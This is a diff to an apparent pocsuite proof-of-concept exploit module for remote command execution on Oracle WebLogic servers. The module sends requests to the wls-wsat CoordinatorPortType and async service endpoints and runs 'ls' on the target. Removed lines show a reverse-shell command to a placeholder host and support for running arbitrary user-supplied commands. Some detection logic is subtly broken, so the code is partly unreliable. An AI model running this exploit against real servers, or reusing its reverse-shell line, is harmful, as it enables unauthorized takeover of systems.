@@ -30,7 +30,7 @@ class TestPOC(POCBase):
     samples = ['']
     install_requires = ['']
 
-    def _verify(self):
+    def _attack(self):
         '''verify mode'''
         def poc_from_wls_v12(cmd):
             headers = {
@@ -122,11 +122,7 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
             vul_url = urljoin(base_url, "/wls-wsat/CoordinatorPortType")
             rce_result = req.post(vul_url, verify=False,
                                   headers=headers, data=body).content
-            if "servers" in rce_result:
-                result['VerifyInfo'] = {}
-                result['VerifyInfo']['URL'] = self.url
-                result['VerifyInfo']['cmd'] = cmd
-                result['VerifyInfo']['result'] = rce_result
+
             return rce_result
 
         def poc_from_asy(cmd):
@@ -165,46 +161,30 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
                 result['VerifyInfo']['cmd'] = cmd
-            return set_po.status_code
+            return sent_poc.status_code
 
         result = {}
         base_url = self.url
         port = urlparse(base_url).port
         if port is None:
             base_url = self.url + ":7001"
-        if 'cmd' not in self.params:
-            logger.log(CUSTOM_LOGGING.SYSINFO,
-                       "You can use --extra-params=\"{'cmd': 'xxx'}\" to exec command")
-            cmd = 'ls'
-            # cmd = "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"
-        else:
-            cmd = self.params['cmd']
         base_cmd = "ls"
-        try:
-            poc_from_wls_v12(base_cmd)
-            if ("bin" and "server")in poc_from_wls_v12(base_cmd):
+        poc_response_v10 = poc_from_wls_v10(base_cmd)
+        if ("bin" and "server" )in poc_response_v10 and "<" not in poc_response_v10:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = self.url
+            result['VerifyInfo']['Version'] = "version 10.*"
+        else:
+            poc_response_v12 = poc_from_wls_v12(base_cmd)
+            if ("bin" and "server" )in poc_response_v12 and "<" not in poc_response_v12:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
-                result['VerifyInfo']['cmd'] = "ls"
-                result['VerifyInfo']['result'] = poc_from_wls_v12(base_cmd)
-                poc_from_wls_v12(cmd)
-                result['VerifyInfo']['cmd'] = cmd
-                result['VerifyInfo']['result'] = poc_from_wls_v12(cmd)
-        except Exception as e:
-            poc_from_wls_v10(base_cmd)
-            if ("bin" and "server")in poc_from_wls_v10(base_cmd):
-                result['VerifyInfo'] = {}
-                result['VerifyInfo']['URL'] = self.url
-                result['VerifyInfo']['cmd'] = "ls"
-                result['VerifyInfo']['result'] = poc_from_wls_v10(base_cmd)
-                poc_from_wls_v10(cmd)
-                result['VerifyInfo']['cmd'] = cmd
-                result['VerifyInfo']['result'] = poc_from_wls_v10(cmd)
-        except Exception as e:
-            poc_from_asy(cmd)
+                result['VerifyInfo']['Version'] = "version 12.*"
+                if result['VerifyInfo'] == None:
+                    poc_from_asy(base_cmd)
         return self.parse_output(result)
 
-    _attack = _verify
+    _verify = _attack
 
     def parse_output(self, result):
         # parse output
